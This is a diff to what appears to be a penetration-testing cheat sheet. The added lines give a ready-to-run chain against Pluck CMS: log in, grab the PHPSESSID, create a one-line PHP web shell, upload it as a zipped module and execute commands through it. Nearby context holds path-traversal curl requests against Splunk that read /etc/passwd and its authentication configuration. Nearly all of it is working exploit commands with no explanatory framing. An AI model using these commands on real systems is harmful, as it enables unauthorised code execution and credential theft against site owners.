@@ -310,6 +310,23 @@ user.password_confirmation = '123qweasdF!'
 user.save!
 Login: https://git.$DOM/$USERNAME
 
+[*] Pluck
++---------- Set Password ----------+
+XPASSWORD=lexypoo97
+
++---------- Get Session ID ----------+
+PHPSESSID=$(curl -s -i -L -X POST -d "cont1=$XPASSWORD&bogus=&submit=Log+in" 'http://$TARGET/login.php' -H 'Content-Type: application/x-www-form-urlencoded' | grep -oP 'PHPSESSID=\K[^;]+');echo $PHPSESSID
+
++---------- Create Webshell  ----------+
+echo -n '<?=`$_GET[cmd]`?>' | tee x.php
+
++---------- Upload Webshell  ----------+
+zip x.zip x.php
+curl -s -i -X POST -F "sendfile=@x.zip;type=application/zip" -F "submit=Upload" "http://%TARGET/admin.php?action=installmodule" -H "Cookie: PHPSESSID=$PHPSESSID" | grep 'The module has been installed successfully.'
+
++---------- Execute Command ----------+
+curl -G --path-as-is 'http://$TARGET/data/modules/x/x.php' --data-urlencode 'cmd=whoami /priv'
+
 [*] Splunk
 curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
 curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'
